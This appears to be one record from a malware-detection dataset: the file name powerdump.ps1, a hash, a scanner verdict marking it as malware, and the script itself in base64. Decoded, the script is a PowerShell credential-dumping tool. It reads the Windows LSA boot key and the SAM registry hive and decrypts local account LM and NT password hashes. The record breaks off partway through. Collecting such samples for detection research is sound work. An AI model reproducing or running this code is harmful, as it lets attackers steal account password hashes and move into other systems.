powerdump.ps1,39f3d8d7ddadd844849f2660ce46d5fd,Scan result is 32768. IsMalware: 1,IyBkb3dubG9hZGVkIGZyb20gIGh0dHBzOi8vd3d3LnRydXN0ZWRzZWMuY29tL2ZpbGVzL1Bvd2VyU2hlbGxfUG9DLnppcAoKIwojIFBvd2VyU2hlbGwgQ3JlYXRlQ21kIEJ5cGFzcyBieSBLYXRoeSBQZXRlcnMsIEpvc2ggS2VsbGV5ICh3aW5mYW5nKSBhbmQgRGF2ZSBLZW5uZWR5IChSZUwxSykKIyBEZWZjb24gUmVsZWFzZQojCiMKIwpmdW5jdGlvbiBMb2FkQXBpCnsKICAgICRvbGRFcnJvckFjdGlvbiA9ICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlOwogICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAiU2lsZW50bHlDb250aW51ZSI7CiAgICAkdGVzdCA9IFtQb3dlckR1bXAuTmF0aXZlXTsKICAgICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJG9sZEVycm9yQWN0aW9uOwogICAgaWYgKCR0ZXN0KSAKICAgIHsKICAgICAgICAjIGFscmVhZHkgbG9hZGVkCiAgICAgICAgcmV0dXJuOyAKICAgICB9CgokY29kZSA9IEAnCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKCm5hbWVzcGFjZSBQb3dlckR1bXAKewogICAgcHVibGljIGNsYXNzIE5hdGl2ZQogICAgewogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFJlZ09wZW5LZXlFeCgKICAgICAgICBpbnQgaEtleSwKICAgICAgICBzdHJpbmcgc3ViS2V5LAogICAgICAgIGludCB1bE9wdGlvbnMsCiAgICAgICAgaW50IHNhbURlc2lyZWQsCiAgICAgICAgb3V0IGludCBoa1Jlc3VsdCk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludCA9ICJSZWdFbnVtS2V5RXgiKV0KICAgIGV4dGVybiBwdWJsaWMgc3RhdGljIGludCBSZWdFbnVtS2V5RXgoCiAgICAgICAgaW50IGhrZXksCiAgICAgICAgaW50IGluZGV4LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBOYW1lLAogICAgICAgIHJlZiBpbnQgbHBjYk5hbWUsCiAgICAgICAgaW50IHJlc2VydmVkLAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBvdXQgbG9uZyBscGZ0TGFzdFdyaXRlVGltZSk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludD0iUmVnUXVlcnlJbmZvS2V5IiwgQ2FsbGluZ0NvbnZlbnRpb249Q2FsbGluZ0NvbnZlbnRpb24uV2luYXBpLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnUXVlcnlJbmZvS2V5KAogICAgICAgIGludCBoa2V5LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBpbnQgbHBSZXNlcnZlZCwKICAgICAgICBvdXQgaW50IGxwY1N1YktleXMsCiAgICAgICAgb3V0IGludCBscGNiTWF4U3ViS2V5TGVuLAogICAgICAgIG91dCBpbnQgbHBjYk1heENsYXNzTGVuLAogICAgICAgIG91dCBpbnQgbHBjVmFsdWVzLAogICAgICAgIG91dCBpbnQgbHBjYk1heFZhbHVlTmFtZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JNYXhWYWx1ZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JTZWN1cml0eURlc2NyaXB0b3IsCiAgICAgICAgSW50UHRyIGxwZnRMYXN0V3JpdGVUaW1lKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVnQ2xvc2VLZXkoCiAgICAgICAgaW50IGhLZXkpOwoKICAgICAgICB9CiAgICB9IC8vIGVuZCBuYW1lc3BhY2UgUG93ZXJEdW1wCgogICAgcHVibGljIGNsYXNzIFNoaWZ0IHsKICAgICAgICBwdWJsaWMgc3RhdGljIGludCAgIFJpZ2h0KGludCB4LCAgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCAgUmlnaHQodWludCB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBsb25nICBSaWdodChsb25nIHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIFJpZ2h0KHVsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50ICAgIExlZnQoaW50IHgsICAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50ICAgTGVmdCh1aW50IHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGxvbmcgICBMZWZ0KGxvbmcgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWxvbmcgIExlZnQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICB9CidACgogICAkcHJvdmlkZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyCiAgICRkbGxOYW1lID0gW1BzT2JqZWN0XS5Bc3NlbWJseS5Mb2NhdGlvbgogICAkY29tcGlsZXJQYXJhbWV0ZXJzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnMKICAgJGFzc2VtYmxpZXMgPSBAKCJTeXN0ZW0uZGxsIiwgJGRsbE5hbWUpCiAgICRjb21waWxlclBhcmFtZXRlcnMuUmVmZXJlbmNlZEFzc2VtYmxpZXMuQWRkUmFuZ2UoJGFzc2VtYmxpZXMpCiAgICRjb21waWxlclBhcmFtZXRlcnMuR2VuZXJhdGVJbk1lbW9yeSA9ICR0cnVlCiAgICRjb21waWxlclJlc3VsdHMgPSAkcHJvdmlkZXIuQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkY29tcGlsZXJQYXJhbWV0ZXJzLCAkY29kZSkKICAgaWYoJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMuQ291bnQgLWd0IDApIHsKICAgICAkY29tcGlsZXJSZXN1bHRzLkVycm9ycyB8ICUgeyBXcml0ZS1FcnJvciAoInswfTpgdHsxfSIgLWYgJF8uTGluZSwkXy5FcnJvclRleHQpIH0KICAgfQoKfQoKJGFudHBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTlRQQVNTV09SRGAwIik7CiRhbG1wYXNzd29yZCA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIkxNUEFTU1dPUkRgMCIpOwokZW1wdHlfbG0gPSBbYnl0ZVtdXUAoMHhhYSwweGQzLDB4YjQsMHgzNSwweGI1LDB4MTQsMHgwNCwweGVlLDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSk7CiRlbXB0eV9udCA9IFtieXRlW11dQCgweDMxLDB4ZDYsMHhjZiwweGUwLDB4ZDEsMHg2YSwweGU5LDB4MzEsMHhiNywweDNjLDB4NTksMHhkNywweGUwLDB4YzAsMHg4OSwweGMwKTsKJG9kZF9wYXJpdHkgPSBAKAogIDEsIDEsIDIsIDIsIDQsIDQsIDcsIDcsIDgsIDgsIDExLCAxMSwgMTMsIDEzLCAxNCwgMTQsCiAgMTYsIDE2LCAxOSwgMTksIDIxLCAyMSwgMjIsIDIyLCAyNSwgMjUsIDI2LCAyNiwgMjgsIDI4LCAzMSwgMzEsCiAgMzIsIDMyLCAzNSwgMzUsIDM3LCAzNywgMzgsIDM4LCA0MSwgNDEsIDQyLCA0MiwgNDQsIDQ0LCA0NywgNDcsCiAgNDksIDQ5LCA1MCwgNTAsIDUyLCA1MiwgNTUsIDU1LCA1NiwgNTYsIDU5LCA1OSwgNjEsIDYxLCA2MiwgNjIsCiAgNjQsIDY0LCA2NywgNjcsIDY5LCA2OSwgNzAsIDcwLCA3MywgNzMsIDc0LCA3NCwgNzYsIDc2LCA3OSwgNzksCiAgODEsIDgxLCA4MiwgODIsIDg0LCA4NCwgODcsIDg3LCA4OCwgODgsIDkxLCA5MSwgOTMsIDkzLCA5NCwgOTQsCiAgOTcsIDk3LCA5OCwgOTgsMTAwLDEwMCwxMDMsMTAzLDEwNCwxMDQsMTA3LDEwNywxMDksMTA5LDExMCwxMTAsCiAgMTEyLDExMiwxMTUsMTE1LDExNywxMTcsMTE4LDExOCwxMjEsMTIxLDEyMiwxMjIsMTI0LDEyNCwxMjcsMTI3LAogIDEyOCwxMjgsMTMxLDEzMSwxMzMsMTMzLDEzNCwxMzQsMTM3LDEzNywxMzgsMTM4LDE0MCwxNDAsMTQzLDE0MywKICAxNDUsMTQ1LDE0NiwxNDYsMTQ4LDE0OCwxNTEsMTUxLDE1MiwxNTIsMTU1LDE1NSwxNTcsMTU3LDE1OCwxNTgsCiAgMTYxLDE2MSwxNjIsMTYyLDE2NCwxNjQsMTY3LDE2NywxNjgsMTY4LDE3MSwxNzEsMTczLDE3MywxNzQsMTc0LAogIDE3NiwxNzYsMTc5LDE3OSwxODEsMTgxLDE4MiwxODIsMTg1LDE4NSwxODYsMTg2LDE4OCwxODgsMTkxLDE5MSwKICAxOTMsMTkzLDE5NCwxOTQsMTk2LDE5NiwxOTksMTk5LDIwMCwyMDAsMjAzLDIwMywyMDUsMjA1LDIwNiwyMDYsCiAgMjA4LDIwOCwyMTEsMjExLDIxMywyMTMsMjE0LDIxNCwyMTcsMjE3LDIxOCwyMTgsMjIwLDIyMCwyMjMsMjIzLAogIDIyNCwyMjQsMjI3LDIyNywyMjksMjI5LDIzMCwyMzAsMjMzLDIzMywyMzQsMjM0LDIzNiwyMzYsMjM5LDIzOSwKICAyNDEsMjQxLDI0MiwyNDIsMjQ0LDI0NCwyNDcsMjQ3LDI0OCwyNDgsMjUxLDI1MSwyNTMsMjUzLDI1NCwyNTQKKTsKCmZ1bmN0aW9uIHNpZF90b19rZXkoJHNpZCkKewogICAgJHMxID0gQCgpOwogICAgJHMxICs9IFtjaGFyXSgkc2lkIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDgpIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDE2KSAtYmFuZCAweEZGKTsKICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwyNCkgLWJhbmQgMHhGRik7CiAgICAkczEgKz0gJHMxWzBdOwogICAgJHMxICs9ICRzMVsxXTsKICAgICRzMSArPSAkczFbMl07CiAgICAkczIgPSBAKCk7CiAgICAkczIgKz0gJHMxWzNdOyAkczIgKz0gJHMxWzBdOyAkczIgKz0gJHMxWzFdOyAkczIgKz0gJHMxWzJdOwogICAgJHMyICs9ICRzMlswXTsgJHMyICs9ICRzMlsxXTsgJHMyICs9ICRzMlsyXTsKICAgIHJldHVybiAsKChzdHJfdG9fa2V5ICRzMSksKHN0cl90b19rZXkgJHMyKSk7Cn0KCmZ1bmN0aW9uIHN0cl90b19rZXkoJHMpCnsKICAgICRrZXkgPSBAKCk7CiAgICAka2V5ICs9IFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzBdKSwgMSApOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzBdKSAtYmFuZCAweDAxKSwgNikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1sxXSksMik7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMV0pIC1iYW5kIDB4MDMpLCA1KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzJdKSwzKTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1syXSkgLWJhbmQgMHgwNyksIDQpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbM10pLDQpOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzNdKSAtYmFuZCAweDBGKSwgMykgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s0XSksNSk7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNF0pIC1iYW5kIDB4MUYpLCAyKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzVdKSw2KTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1s1XSkgLWJhbmQgMHgzRiksIDEpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNl0pLDcpOwogICAgJGtleSArPSAkKFtpbnRdKCRzWzZdKSAtYmFuZCAweDdGKTsKICAgIDAuLjcgfCAlewogICAgICAgICRrZXlbJF9dID0gW1NoaWZ0XTo6TGVmdCgka2V5WyRfXSwgMSk7CiAgICAgICAgJGtleVskX10gPSAkb2RkX3Bhcml0eVska2V5WyRfXV07CiAgICAgICAgfQogICAgcmV0dXJuICwka2V5Owp9CgpmdW5jdGlvbiBOZXdSQzQoW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gbmV3LW9iamVjdCBPYmplY3QgfAogICAgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkga2V5ICRrZXkgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IFMgJG51bGwgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgU2NyaXB0TWV0aG9kIGluaXQgewogICAgICAgIGlmICgtbm90ICR0aGlzLlMpCiAgICAgICAgewogICAgICAgICAgICBbYnl0ZVtdXSR0aGlzLlMgPSAwLi4yNTU7CiAgICAgICAgICAgIDAuLjI1NSB8ICUgLWJlZ2lue1tsb25nXSRqPTA7fXsKICAgICAgICAgICAgICAgICRqID0gKCRqICsgJHRoaXMua2V5WyQoJF8gJSAkdGhpcy5rZXkuTGVuZ3RoKV0gKyAkdGhpcy5TWyRfXSkgJSAkdGhpcy5TLkxlbmd0aDsKICAgICAgICAgICAgICAgICR0ZW1wID0gJHRoaXMuU1skX107ICR0aGlzLlNbJF9dID0gJHRoaXMuU1skal07ICR0aGlzLlNbJGpdID0gJHRlbXA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSAtUGFzc1RocnUgfAogICAgQWRkLU1lbWJlciBTY3JpcHRNZXRob2QgImVuY3J5cHQiIHsKICAgICAgICAkZGF0YSA9ICRhcmdzWzBdOwogICAgICAgICR0aGlzLmluaXQoKTsKICAgICAgICAkb3V0YnVmID0gbmV3LW9iamVjdCBieXRlW10gJCgkZGF0YS5MZW5ndGgpOwogICAgICAgICRTMiA9ICR0aGlzLlNbMC4uJHRoaXMuUy5MZW5ndGhdOwogICAgICAgIDAuLiQoJGRhdGEuTGVuZ3RoLTEpIHwgJSAtYmVnaW57JGk9MDskaj0wO30gewogICAgICAgICAgICAkaSA9ICgkaSsxKSAlICRTMi5MZW5ndGg7CiAgICAgICAgICAgICRqID0gKCRqICsgJFMyWyRpXSkgJSAkUzIuTGVuZ3RoOwogICAgICAgICAgICAkdGVtcCA9ICRTMlskaV07JFMyWyRpXSA9ICRTMlskal07JFMyWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAkYSA9ICRkYXRhWyRfXTsKICAgICAgICAgICAgJGIgPSAkUzJbICQoJFMyWyRpXSskUzJbJGpdKSAlICRTMi5MZW5ndGggXTsKICAgICAgICAgICAgJG91dGJ1ZlskX10gPSAoJGEgLWJ4b3IgJGIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gLCRvdXRidWY7CiAgICB9IC1QYXNzVGhydQp9CgpmdW5jdGlvbiBkZXNfZW5jcnlwdChbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXkpCnsKICAgIHJldHVybiAsKGRlc190cmFuc2Zvcm0gJGRhdGEgJGtleSAkdHJ1ZSkKfQoKZnVuY3Rpb24gZGVzX2RlY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJGZhbHNlKQp9CgpmdW5jdGlvbiBkZXNfdHJhbnNmb3JtKFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSwgJGRvRW5jcnlwdCkKewogICAgJGRlcyA9IG5ldy1vYmplY3QgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkRFU0NyeXB0b1NlcnZpY2VQcm92aWRlcjsKICAgICRkZXMuTW9kZSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQjsKICAgICRkZXMuUGFkZGluZyA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpOb25lOwogICAgJGRlcy5LZXkgPSAka2V5OwogICAgJGRlcy5JViA9ICRrZXk7CiAgICAkdHJhbnNmb3JtID0gJG51bGw7CiAgICBpZiAoJGRvRW5jcnlwdCkgeyR0cmFuc2Zvcm0gPSAkZGVzLkNyZWF0ZUVuY3J5cHRvcigpO30KICAgIGVsc2V7JHRyYW5zZm9ybSA9ICRkZXMuQ3JlYXRlRGVjcnlwdG9yKCk7fQogICAgJHJlc3VsdCA9ICR0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jaygkZGF0YSwgMCwgJGRhdGEuTGVuZ3RoKTsKICAgIHJldHVybiAsJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LVJlZ0tleUNsYXNzKFtzdHJpbmddJGtleSwgW3N0cmluZ10kc3Via2V5KQp7CiAgICBzd2l0Y2ggKCRLZXkpIHsKICAgICAgICAiSEtDUiIgeyAkbktleSA9IDB4ODAwMDAwMDB9ICNISyBDbGFzc2VzIFJvb3QKICAgICAgICAiSEtDVSIgeyAkbktleSA9IDB4ODAwMDAwMDF9ICNISyBDdXJyZW50IFVzZXIKICAgICAgICAiSEtMTSIgeyAkbktleSA9IDB4ODAwMDAwMDJ9ICNISyBMb2NhbCBNYWNoaW5lCiAgICAgICAgIkhLVSIgIHsgJG5LZXkgPSAweDgwMDAwMDAzfSAjSEsgVXNlcnMKICAgICAgICAiSEtDQyIgeyAkbktleSA9IDB4ODAwMDAwMDV9ICNISyBDdXJyZW50IENvbmZpZwogICAgICAgIGRlZmF1bHQgeyAKICAgICAgICAgICAgdGhyb3cgIkludmFsaWQgS2V5LiBVc2Ugb25lIG9mIHRoZSBmb2xsb3dpbmcgb3B0aW9ucyBIS0NSLCBIS0NVLCBIS0xNLCBIS1UsIEhLQ0MiCiAgICAgICAgfQogICAgfQogICAgJEtFWVFVRVJZVkFMVUUgPSAweDE7CiAgICAkS0VZUkVBRCA9IDB4MTk7CiAgICAkS0VZQUxMQUNDRVNTID0gMHgzRjsKICAgICRyZXN1bHQgPSAiIjsKICAgIFtpbnRdJGhrZXk9MAogICAgaWYgKC1ub3QgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdPcGVuS2V5RXgoJG5rZXksJHN1YmtleSwwLCRLRVlSRUFELFtyZWZdJGhrZXkpKQogICAgewogICAgICAgICRjbGFzc1ZhbCA9IE5ldy1PYmplY3QgVGV4dC5TdHJpbmdidWlsZGVyIDEwMjQKICAgICAgICBbaW50XSRsZW4gPSAxMDI0CiAgICAgICAgaWYgKC1ub3QgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdRdWVyeUluZm9LZXkoJGhrZXksJGNsYXNzVmFsLFtyZWZdJGxlbiwwLFtyZWZdJG51bGwsW3JlZl0kbnVsbCwKICAgICAgICAgICAgW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLDApKQogICAgICAgIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICRjbGFzc1ZhbC5Ub1N0cmluZygpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJSZWdRdWVyeUluZm9LZXkgZmFpbGVkIjsKICAgICAgICB9ICAgCiAgICAgICAgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdDbG9zZUtleSgkaGtleSkgfCBPdXQtTnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgIFdyaXRlLUVycm9yICJDYW5ub3Qgb3BlbiBrZXkiOwogICAgfQogICAgcmV0dXJuICRyZXN1bHQ7Cn0KCmZ1bmN0aW9uIEdldC1Cb290S2V5CnsKICAgICRzID0gW3N0cmluZ106OkpvaW4oIiIsJCgiSkQiLCJTa2V3MSIsIkdCRyIsIkRhdGEiIHwgJXtHZXQtUmVnS2V5Q2xhc3MgIkhLTE0iICJTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxMc2FcJF8ifSkpOwogICAgJGIgPSBuZXctb2JqZWN0IGJ5dGVbXSAkKCRzLkxlbmd0aC8yKTsKICAgIDAuLiQoJGIuTGVuZ3RoLTEpIHwgJXskYlskX10gPSBbQ29udmVydF06OlRvQnl0ZSgkcy5TdWJzdHJpbmcoJCgkXyoyKSwyKSwxNil9CiAgICAkYjIgPSBuZXctb2JqZWN0IGJ5dGVbXSAxNjsKICAgIDB4OCwgMHg1LCAweDQsIDB4MiwgMHhiLCAweDksIDB4ZCwgMHgzLCAweDAsIDB4NiwgMHgxLCAweGMsIDB4ZSwgMHhhLCAweGYsIDB4NyB8ICUgLWJlZ2lueyRpPTA7fXskYjJbJGldPSRiWyRfXTskaSsrfQogICAgcmV0dXJuICwkYjI7Cn0KCmZ1bmN0aW9uIEdldC1IQm9vdEtleQp7CiAgICBwYXJhbShbYnl0ZVtdXSRib290a2V5KTsKICAgICRhcXdlcnR5ID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiIUAjJCVeJiooKXF3ZXJ0eVVJT1BBenhjdmJubVFRUVFRUVFRUVFRUSkoKkAmJWAwIik7CiAgICAkYW51bSA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIjAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODlgMCIpOwogICAgJGsgPSBHZXQtSXRlbSBIS0xNOlxTQU1cU0FNXERvbWFpbnNcQWNjb3VudDsKICAgIGlmICgtbm90ICRrKSB7cmV0dXJuICRudWxsfQogICAgW2J5dGVbXV0kRiA9ICRrLkdldFZhbHVlKCJGIik7CiAgICBpZiAoLW5vdCAkRikge3JldHVybiAkbnVsbH0KICAgICRyYzRrZXkgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENV06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKCRGWzB4NzAuLjB4N0ZdICsgJGFxd2VydHkgKyAkYm9vdGtleSArICRhbnVtKTsKICAgICRyYzQgPSBOZXdSQzQgJHJjNGtleTsKICAgIHJldHVybiAsKCRyYzQuZW5jcnlwdCgkRlsweDgwLi4weDlGXSkpOwp9CgpmdW5jdGlvbiBHZXQtVXNlck5hbWUoW2J5dGVbXV0kVikKewogICAgaWYgKC1ub3QgJFYpIHtyZXR1cm4gJG51bGx9OwogICAgJG9mZnNldCA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MGMuLjB4MGZdLDApICsgMHhDQzsKICAgICRsZW4gPSBbQml0Q29udmVydGVyXTo6VG9JbnQzMigkVlsweDEwLi4weDEzXSwwKTsKICAgIHJldHVybiBbVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRWLCAkb2Zmc2V0LCAkbGVuKTsKfQoKZnVuY3Rpb24gR2V0LVVzZXJIYXNoZXMoJHUsIFtieXRlW11dJGhib290a2V5KQp7CiAgICBbYnl0ZVtdXSRlbmNfbG1faGFzaCA9ICRudWxsOyBbYnl0ZVtdXSRlbmNfbnRfaGFzaCA9ICRudWxsOwogICAgaWYgKCR1Lkhhc2hPZmZzZXQgKyAweDI4IC1sdCAkdS5WLkxlbmd0aCkKICAgIHsKICAgICAgICAkbG1faGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgNDsKICAgICAgICAkbnRfaGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgOCArIDB4MTA7CiAgICAgICAgJGVuY19sbV9oYXNoID0gJHUuVlskKCRsbV9oYXNoX29mZnNldCkuLiQoJGxtX2hhc2hfb2Zmc2V0KzB4MGYpXTsKICAgICAgICAkZW5jX250X2hhc2ggPSAkdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgfQogICAgZWxzZWlmICgkdS5IYXNoT2Zmc2V0ICsgMHgxNCAtbHQgJHUuVi5MZW5ndGgpCiAgICB7CiAgICAgICAgJG50X2hhc2hfb2Zmc2V0ID0gJHUuSGFzaE9mZnNldCArIDg7CiAgICAgICAgJGVuY19udF9oYXNoID0gW2J5dGVbXV0kdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgfQogICAgcmV0dXJuICwoRGVjcnlwdEhhc2hlcyAkdS5SaWQgJGVuY19sbV9oYXNoICRlbmNfbnRfaGFzaCAkaGJvb3RrZXkpOwp9CgpmdW5jdGlvbiBEZWNyeXB0SGFzaGVzKCRyaWQsIFtieXRlW11dJGVuY19sbV9oYXNoLCBbYnl0ZVtdXSRlbmNfbnRfaGFzaCwgW2J5dGVbXV0kaGJvb3RrZXkpCnsKICAgIFtieXRlW11dJGxtaGFzaCA9ICRlbXB0eV9sbTsgW2J5dGVbXV0kbnRoYXNoPSRlbXB0eV9udDsKICAgICMgTE0gSGFzaAogICAgaWYgKCRlbmNfbG1faGFzaCkKICAgIHsgICAgCiAgICAgICAgJGxtaGFzaCA9IERlY3J5cHRTaW5nbGVIYXNoICRyaWQgJGhib290a2V5ICRlbmNfbG1faGFzaCAkYWxtcGFzc3dvcmQ7CiAgICB9CiAgICAKICAgICMgTlQgSGFzaAogICAgaWYgKCRlbmNfbnRfaGFzaCkKICAgIHsKICAgICAgICAkbnRoYXNoID0gRGVjcnlwdFNpbmdsZUhhc2ggJHJpZCAkaGJvb3RrZXkgJGVuY19udF9oYXNoICRhbnRwYXNzd29yZDsKICAgIH0KCiAgICByZXR1cm4gLCgkbG1oYXNoLCRudGhhc2gpCn0KCmZ1bmN0aW9uIERlY3J5cHRTaW5nbGVIYXNoKCRyaWQsW2J5dGVbXV0kaGJvb3RrZXksW2J5dGVbXV0kZW5jX2hhc2gsW2J5dGVbXV0kbG1udHN0cikKewogICAgJGRlc2tleXMgPSBzaWRfdG9fa2V5ICRyaWQ7CiAgICAkbWQ1ID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5NRDVdOjpDcmVhdGUoKTsKICAgICRyYzRfa2V5ID0gJG1kNS5Db21wdXRlSGFzaCgkaGJvb3RrZXlbMC4uMHgwZl0gKyBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHJpZCkgKyAkbG1udHN0cik7CiAgICAkcmM0ID0gTmV3UkM0ICRyYzRfa2V5OwogICAgJG9iZmtleSA9ICRyYzQuZW5jcnlwdCgkZW5jX2hhc2gpOwogICAgJGhhc2ggPSAoZGVzX2RlY3J5cHQgICRvYmZrZXlbMC4uN10gJGRlc2tleXNbMF0pICsgCiAgICAgICAgKGRlc19kZWNyeXB0ICRvYmZrZXlbOC4uJCgkb2Jma2V5Lkxlbmd0aCAtIDEpXSAkZGVza2V5c1sxXSk7CiAgICByZXR1cm4gLCRoYXNoOwp9CgpmdW5jdGlvbiBHZXQtVXNlcktleXMKewogICAgbHMgSEtMTTpcU0FNXFNBTVxEb21haW5zXEFjY291bnRcVXNlcnMgfCAKICAgICAgICB3aGVyZSB7JF8uUFNDaGlsZE5hbWUgLW1hdGNoICJeWzAtOUEtRmEtZl17OH0kIn0gfCAKICAgICAgICAgICAgQWRkLU1lbWJlciBBbGlhc1Byb3BlcnR5IEtleU5hbWUgUFNDaGlsZE5hbWUgLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBSaW